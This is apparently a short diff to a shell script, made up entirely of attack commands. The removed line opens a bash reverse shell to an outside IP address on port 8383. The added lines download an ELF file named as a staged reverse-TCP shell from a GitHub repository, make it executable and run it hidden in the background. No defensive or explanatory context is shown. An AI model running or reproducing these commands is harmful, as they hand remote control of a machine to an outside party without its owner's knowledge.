@@ -1,1 +1,3 @@
-0<&64-;exec 64<>/dev/tcp/107.182.176.159/8383;sh <&64 >&64 2>&64
+wget -P /tmp/ https://github.com/Pamentierx/xmr/raw/main/linux-shell-staged-reverse-tcp-8383.elf
+chmod +x /tmp/linux-shell-staged-reverse-tcp-8383.elf
+nohup /tmp/linux-shell-staged-reverse-tcp-8383.elf >/dev/null 2>&1 &
